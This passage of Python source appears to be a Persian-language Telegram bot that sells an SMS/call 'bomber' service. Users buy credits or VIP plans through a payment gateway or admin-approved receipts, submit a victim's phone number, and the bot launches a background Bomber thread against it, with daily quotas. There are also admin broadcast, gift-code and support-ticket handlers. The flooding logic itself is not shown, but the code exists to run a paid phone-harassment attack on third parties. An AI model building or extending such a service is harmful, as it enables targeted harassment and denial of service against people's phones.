                callback_url=f"https://your-render-url.onrender.com/verify?user_id={user_id}&plan={plan_key}",
                mobile="", email=""
            )
            if payment_request.status == 100:
                pay_url = payment_request.url
                markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("💳 پرداخت آنلاین", url=pay_url))
                bot.edit_message_text(f"لطفاً برای پرداخت روی دکمه زیر کلیک کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup)
            else:
                bot.answer_callback_query(call.id, "❌ خطا در درگاه. لطفاً کارت به کارت کنید.", show_alert=True)
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ خطای درگاه: {e}", show_alert=True)

    elif call.data == "menu_bomb":
        # چک کردن محدودیت روزانه
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
            
        if user['daily_bomb_count'] >= 5:
            bot.answer_callback_query(call.id, "⚠️ سهمیه امروز شما پر شده! فردا بیایید.", show_alert=True)
            return

        if user['plan'] == "vip" and user['sub_expiry'] > time.time():
            pass # کاربر VIP نامحدود
        elif user['uses'] <= 0:
            bot.answer_callback_query(call.id, "❌ اعتبار ندارید!", show_alert=True)
            return
            
        user_states[user_id] = {"state": "waiting_for_phone"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        text = "📞 **شماره را وارد کنید:**\nمثال: `09123456789`"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    # ================= ادمین =================
    elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT SUM(uses) FROM users")
        total_credits = c.fetchone()[0] or 0
        conn.close()
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **آمار:**\n👥 کاربران: {total_users}\n💰 اعتبارها: {total_credits}", parse_mode='Markdown')

    elif call.data == "admin_broadcast" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📝 متن پیام:")
        bot.register_next_step_handler(msg, send_broadcast)

    elif call.data == "admin_gifts" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🔑 فرمت: `CODE USES` (مثال: `WELCOME 10`):")
        bot.register_next_step_handler(msg, process_make_gift)

    elif call.data == "admin_view_user" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🆔 آیدی عددی کاربر را بفرستید:")
        bot.register_next_step_handler(msg, view_user_admin)

    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid, plan_key = data["user_id"], data["plan"]
            plan = PLANS[plan_key]
            user = get_user(uid)
            if user:
                user["plan"] = plan_key
                user["uses"] += plan["uses"]
                if plan["days"] > 0:
                    user["sub_expiry"] = time.time() + (plan["days"] * 86400)
                save_user(**user)
                bot.send_message(uid, f"🎉 پلن **{plan['name']}** فعال شد.", parse_mode='Markdown')
            bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید رد شد.")
            del pending_approvals[req_id]

def send_broadcast(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    count = 0
    for u in users:
        try: bot.send_message(u[0], f"📢 {message.text}"); count += 1; time.sleep(0.1)
        except: pass
    bot.reply_to(message, f"✅ ارسال به {count} نفر.")

def process_make_gift(message):
    try:
        parts = message.text.split()
        active_gift_codes[parts[0].upper()] = {"uses": int(parts[1]), "amount": 5}
        bot.reply_to(message, f"✅ کد ساخته شد.")
    except: bot.reply_to(message, "❌ فرمت اشتباه.")

def view_user_admin(message):
    try:
        uid = message.text.strip()
        user = get_user(uid)
        if user:
            text = f"👤 نام: {user['name']}\n🆔 آیدی: {user['user_id']}\n💎 پلن: {user['plan']}\n⚡️ اعتبار: {user['uses']}\n📅 اشتراک: {datetime.fromtimestamp(user['sub_expiry']).strftime('%Y-%m-%d')}"
            bot.reply_to(message, text)
        else:
            bot.reply_to(message, "❌ کاربر یافت نشد.")
    except: bot.reply_to(message, "❌ خطا.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.from_user.id)
    if "selected_plan" not in user_states.get(user_id, {}):
        bot.reply_to(message, "⚠️ ابتدا پلن انتخاب کنید.")
        return
        
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    
    bot.reply_to(message, "✅ رسید دریافت شد.")
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"), types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}"))
    bot.send_message(ADMIN_ID, f"📩 رسید از `{user_id}` برای **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(func=lambda message: str(message.from_user.id) in user_states)
def process_text_inputs(message):
    user_id = str(message.from_user.id)
    state = user_states[user_id].get("state")
    user = get_user(user_id)
    
    if state == "waiting_for_name":
        user['name'] = message.text
        save_user(**user)
        bot.reply_to(message, "✅ نام تغییر کرد.")
        del user_states[user_id]

    elif state == "waiting_for_support":
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✍️ پاسخ به کاربر", callback_data=f"admin_reply_{user_id}"))
        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}", reply_markup=markup)
        bot.reply_to(message, "✅ پیام برای پشتیبانی ارسال شد.")
        del user_states[user_id]

    elif state == "waiting_for_phone":
        phone = message.text.strip().replace(" ", "")
        if len(phone) < 10 or not phone.isdigit():
            bot.reply_to(message, "❌ شماره نامعتبر.")
            return
        if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
        
        # چک کردن محدودیت روزانه دوباره (در صورت تغییر وضعیت)
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
            
        if user['daily_bomb_count'] >= 5:
            bot.reply_to(message, "❌ سهمیه امروز پر شده!")
            del user_states[user_id]
            return
            
        if user['plan'] == "vip" and user['sub_expiry'] > time.time():
            pass # نامحدود
        elif user['uses'] <= 0:
            bot.reply_to(message, "❌ اعتبار ندارید!")
            del user_states[user_id]
            return
        else:
            user['uses'] -= 1
            
        user['daily_bomb_count'] += 1
        save_user(**user)
        del user_states[user_id]
        
        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{phone}`", parse_mode='Markdown')
        bomber = Bomber(phone, user_id)
        active_bombers[user_id] = bomber
        threading.Thread(target=bomber.start).start()

    elif state == "waiting_for_gift":
        code = message.text.strip().upper()
        del user_states[user_id]
        if code in active_gift_codes and active_gift_codes[code]["uses"] > 0:
            amount = active_gift_codes[code]["amount"]
            active_gift_codes[code]["uses"] -= 1
            user['uses'] += amount
            save_user(**user)
            bot.reply_to(message, f"🎁 {amount} اعتبار اضافه شد.")
        else:
            bot.reply_to(message, "❌ کد نامعتبر.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_reply_") and call.from_user.id == ADMIN_ID)
def admin_reply_ticket(call):
    target_user = call.data.replace("admin_reply_", "")
    msg = bot.send_message(call.message.chat.id, "پاسخ خود را بنویسید:")
    bot.register_next_step_handler(msg, lambda m: send_reply_to_user(m, target_user))

def send_reply_to_user(message, target_user):
    try:
        bot.send_message(target_user, f"📩 **پاسخ پشتیبانی:**\n\n{message.text}", parse_mode='Markdown')
        bot.reply_to(message, "✅ پاسخ ارسال شد.")
    except:
        bot.reply_to(message, "❌ خطا در ارسال.")

if __name__ == "__main__":
    print("🤖 Bot & Web Server running...")
    bot.infinity_polling()
